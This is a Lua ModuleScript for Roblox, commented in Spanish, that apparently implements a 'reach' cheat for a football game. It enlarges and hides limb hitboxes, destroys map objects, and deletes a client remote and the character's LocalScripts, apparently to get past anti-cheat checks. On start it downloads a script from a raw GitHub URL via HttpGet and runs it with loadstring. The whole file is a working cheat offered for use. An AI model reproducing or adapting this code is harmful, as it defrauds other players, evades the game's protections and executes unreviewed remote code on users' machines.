-- ReachModule (ModuleScript)
local module = {}

-- CONFIG DEFAULTS (se pueden sobrescribir desde el LocalScript)
module.reach = true
module.reachopacity = 1
module.legreach = true
module.legreachmul = 2.4
module.armreach = false
module.armreachmul = 52
module.trollclear = false
module.externalScriptUrl = "https://raw.githubusercontent.com/entryxy/T23954u8/refs/heads/main/x10.lua"
module.cloneAnchoredDelay = 0.1

local Debris = game:GetService("Debris")

-- helper para obtener character
local function getCharacter(player, timeout)
	timeout = timeout or 5
	local t0 = tick()
	while tick() - t0 < timeout do
		if player.Character and player.Character.Parent then
			return player.Character
		end
		wait(0.05)
	end
	return player.Character
end

-- **CLONADO EXACTO**: aquí está la parte replicada exactamente como en tu LocalScript original
function module:CloneAndWeldPart(character, partName)
	if not character then return end
	local part = character:FindFirstChild(partName)
	if part then
		-- código idéntico al tuyo
		local partCopy = part:Clone()
		partCopy.Parent = part.Parent
		partCopy.Anchored = true

		local weldConstraint = Instance.new("WeldConstraint")
		weldConstraint.Part0 = partCopy
		weldConstraint.Part1 = part

		weldConstraint.Parent = partCopy
		wait(0.1)
		partCopy.Anchored = false
	end
end

-- aplicar reach (sin tocar clonados; se hace después igual que en tu script original)
function module:ApplyReachToCharacter(character)
	if not character then return end

	local function safeSet(partName, sizeVec3, transparency, massless)
		local p = character:FindFirstChild(partName)
		if p and p:IsA("BasePart") then
			p.Size = sizeVec3
			p.Transparency = transparency
			p.Massless = massless
		end
	end

	if self.reach then
		if self.armreach then
			local armSize = Vector3.new(self.armreachmul or 1, self.armreachmul or 1, self.armreachmul or 1)
			safeSet("Right Arm", armSize, self.reachopacity or 1, true)
			safeSet("Left Arm", armSize, self.reachopacity or 1, true)
		end
		if self.legreach then
			local legSize = Vector3.new(self.legreachmul or 2.4, 2, self.legreachmul or 2.4)
			safeSet("Right Leg", legSize, self.reachopacity or 1, true)
			safeSet("Left Leg", legSize, self.reachopacity or 1, true)
		end
	else
		safeSet("Right Arm", Vector3.new(1,2,1), 0, true)
		safeSet("Left Arm", Vector3.new(1,2,1), 0, true)
		safeSet("Right Leg", Vector3.new(1,2,1), 0, true)
		safeSet("Left Leg", Vector3.new(1,2,1), 0, true)
	end
end

-- Implementación simplificada de trollclear (mantengo la lógica principal, igual que tu script)
function module:MaybeSetupTrollClear(player)
	if not self.trollclear then return end
	if not player then return end
	if player.Backpack:FindFirstChild("TrollClear") then return end

	pcall(function()
		if workspace:FindFirstChild("StadiumMain") then workspace.StadiumMain:Destroy() end
		if workspace:FindFirstChild("Walls") then workspace.Walls:Destroy() end
		if workspace:FindFirstChild("Campo") and workspace.Campo:FindFirstChild("Grama") then
			workspace.Campo.Grama.Size = Vector3.new(2048, 2, 2048)
		end
	end)

	local lightingTool = nil
	pcall(function()
		if game:GetService("Lighting"):FindFirstChild("Tools") then
			local maybe = game:GetService("Lighting").Tools:FindFirstChild("Clear")
			if maybe and maybe:FindFirstChild("GK") and maybe.GK:FindFirstChild("Clear") then
				lightingTool = maybe.GK.Clear:Clone()
			end
		end
	end)

	if lightingTool then
		lightingTool.Name = "TrollClear"
		lightingTool.Parent = player.Backpack

		for _, child in pairs(lightingTool:GetChildren()) do
			if child:IsA("LocalScript") and child.Name ~= "X" then
				child:Destroy()
			end
		end

		local equipped = false
		local firing = false
		lightingTool.Equipped:Connect(function()
			equipped = true
			local char = player.Character
			if char and char:FindFirstChild("Right Arm") then
				char["Right Arm"].Massless = true
				char["Left Arm"].Massless = true
				char["Right Arm"].Transparency = 1
				char["Left Arm"].Transparency = 1
				char["Right Arm"].Size = Vector3.new(2048, 25, 2048)
				char["Left Arm"].Size = Vector3.new(2048, 25, 2048)
			end
		end)
		lightingTool.Unequipped:Connect(function()
			equipped = false
			local char = player.Character
			if char then
				if self.armreach then
					local armSize = Vector3.new(self.armreachmul or 1, self.armreachmul or 1, self.armreachmul or 1)
					if char:FindFirstChild("Right Arm") then
						char["Right Arm"].Size = armSize
						char["Right Arm"].Transparency = self.reachopacity or 1
						char["Right Arm"].Massless = true
					end
					if char:FindFirstChild("Left Arm") then
						char["Left Arm"].Size = armSize
						char["Left Arm"].Transparency = self.reachopacity or 1
						char["Left Arm"].Massless = true
					end
				else
					if char:FindFirstChild("Right Arm") then
						char["Right Arm"].Size = Vector3.new(1,2,1)
						char["Right Arm"].Transparency = 0
						char["Right Arm"].Massless = true
					end
					if char:FindFirstChild("Left Arm") then
						char["Left Arm"].Size = Vector3.new(1,2,1)
						char["Left Arm"].Transparency = 0
						char["Left Arm"].Massless = true
					end
				end
			end
		end)

		-- comportamiento de disparo (simplificado)
		spawn(function()
			local char = player.Character
			if not char then return end
			local rightArm = char:FindFirstChild("Right Arm")
			if not rightArm then return end
			local mouse = player:GetMouse()
			mouse.KeyDown:Connect(function(k) if k == "x" then firing = true end end)
			mouse.KeyUp:Connect(function(k) if k == "x" then firing = false end end)
			rightArm.Touched:Connect(function(hit)
				if not firing then return end
				if not equipped then return end
				if hit and hit.Name == "TPS" then
					local sound = Instance.new("Sound")
					sound.Volume = 4
					sound.Name = "Crit"
					sound.Parent = game:GetService("SoundService")
					sound.SoundId = "rbxassetid://8255306220"
					sound:Play()
					Debris:AddItem(sound, 1)
				end
			end)
		end)
	end
end

function module:TryLoadExternalScript()
	if not self.externalScriptUrl or self.externalScriptUrl == "" then return end
	pcall(function()
		local http = game:HttpGet(self.externalScriptUrl)
		if http and http ~= "" then
			local f = loadstring(http)
			if f then pcall(f) end
		end
	end)
end

-- Start: punto de entrada (hace CLONADOS primero exactamente igual que tu LocalScript original)
function module:Start(player)
	if not player then error("ReachModule: Start requires player") end
	local character = getCharacter(player, 5)
	if not character then
		warn("ReachModule: character not found for player")
		return
	end

	-- si existe workspace.Configuration replico el comportamiento original de destruir ciertos objetos
	if workspace:FindFirstChild("Configuration") then
		pcall(function()
			if player.Character:FindFirstChild("ClientRemotesFire") then
				player.Character.ClientRemotesFire:Destroy()
			end
		end)
		wait(1)
		-- destruir LocalScripts del character (igual que en tu script original)
		for _, c in pairs(player.Character:GetChildren()) do
			if c:IsA("LocalScript") then
				c:Destroy()
			end
		end
	else
		-- tu script original retornaba aquí; para mantener comportamiento similar no retornamos para evitar detener todo,
		-- pero dejamos la eliminación de remotes igual arriba.
	end

	-- CLONAR PIERNAS (exacto)
	self:CloneAndWeldPart(character, "Right Leg")
	self:CloneAndWeldPart(character, "Left Leg")

	-- cargar script externo (si está configurado)
	self:TryLoadExternalScript()

	-- setup trollclear si corresponde
	self:MaybeSetupTrollClear(player)

	-- aplicar reach (tamaño/transparencia/massless)
	self:ApplyReachToCharacter(character)
end

return module
